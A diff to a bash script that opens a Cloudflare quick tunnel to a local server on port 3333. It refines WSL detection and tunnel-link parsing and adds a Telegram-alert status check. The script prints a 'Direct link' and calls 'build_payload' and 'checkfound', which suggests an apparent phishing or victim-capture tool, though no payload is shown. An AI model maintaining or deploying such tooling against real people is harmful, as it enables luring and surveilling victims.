@@ -6,8 +6,8 @@
 # --------------------------------------------------
 
 # Windows compatibility check
-if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
-  # We're on Windows
+if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]] || grep -qi microsoft /proc/version 2>/dev/null; then
+  # We're on Windows or WSL
   windows_mode=true
   echo "Windows system detected. Some commands will be adapted for Windows compatibility."
   
@@ -584,7 +584,11 @@ cloudflare_tunnel() {
   local cf_bin=""
 
   # (a) Local binary inside the project directory
-  if [[ "$windows_mode" == true ]] && [[ -e "./cloudflared.exe" ]]; then
+  if [[ "$windows_mode" == true ]] && [[ -s "./cloudflared.exe" && $(wc -c < "./cloudflared.exe" 2>/dev/null || echo 0) -gt 100000 ]]; then
+    cf_bin="./cloudflared.exe"
+  elif [[ -s "./cloudflared" && $(wc -c < "./cloudflared" 2>/dev/null || echo 0) -gt 100000 ]]; then
+    cf_bin="./cloudflared"
+  elif [[ -e "./cloudflared.exe" ]]; then
     cf_bin="./cloudflared.exe"
   elif [[ -e "./cloudflared" ]]; then
     cf_bin="./cloudflared"
@@ -693,7 +697,7 @@ cloudflare_tunnel() {
   "$cf_bin" tunnel \
     --url http://127.0.0.1:3333 \
     --no-autoupdate \
-    --protocol http2 \
+    --edge-ip-version auto \
     > .cloudflared.log 2>&1 &
 
   local cf_pid=$!
@@ -715,7 +719,8 @@ cloudflare_tunnel() {
     fi
 
     sleep 1
-    link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare\.com' ".cloudflared.log" 2>/dev/null)
+    # Extract only valid generated subdomains, strictly excluding internal api.trycloudflare.com
+    link=$(grep -o 'https://[a-zA-Z0-9-]*\.trycloudflare\.com' ".cloudflared.log" 2>/dev/null | grep -v 'api\.trycloudflare\.com' | head -n 1)
     if [[ -n "$link" ]]; then
       # Wait 3 more seconds for the tunnel to fully stabilise.
       # The URL appears in the log before the edge route is propagated;
@@ -774,8 +779,24 @@ cloudflare_tunnel() {
   fi
 
   printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+  check_telegram_status
   build_payload "$link"
   checkfound
+}
+
+check_telegram_status() {
+  local token=""
+  local chat_id=""
+  if [[ -f ".env" ]]; then
+    token=$(grep -E '^[[:space:]]*(export[[:space:]]+)?TELEGRAM_BOT_TOKEN[[:space:]]*=' .env 2>/dev/null | head -n1 | sed -E 's/^[[:space:]]*(export[[:space:]]+)?TELEGRAM_BOT_TOKEN[[:space:]]*=[[:space:]]*["'\'']?([^"'\'']*)["'\'']?/\2/' | tr -d '\r\n ')
+    chat_id=$(grep -E '^[[:space:]]*(export[[:space:]]+)?TELEGRAM_CHAT_ID[[:space:]]*=' .env 2>/dev/null | head -n1 | sed -E 's/^[[:space:]]*(export[[:space:]]+)?TELEGRAM_CHAT_ID[[:space:]]*=[[:space:]]*["'\'']?([^"'\'']*)["'\'']?/\2/' | tr -d '\r\n ')
+  fi
+
+  if [[ -n "$token" && -n "$chat_id" ]]; then
+    printf "\e[1;92m[\e[0m+\e[1;92m] Telegram Bot Alerts: \e[1;92mACTIVE\e[0m \e[1;90m(Chat: %s)\e[0m\n" "$chat_id"
+  else
+    printf "\e[1;93m[\e[0m!\e[1;93m] Telegram Bot Alerts: \e[1;93mNOT CONFIGURED\e[0m \e[1;90m(Edit .env to receive real-time alerts)\e[0m\n"
+  fi
 }
 
 # --------------------------------------------------
@@ -1067,6 +1088,7 @@ fi
   fi
 
   printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"
+  check_telegram_status
   build_payload "$link"
   checkfound
 }
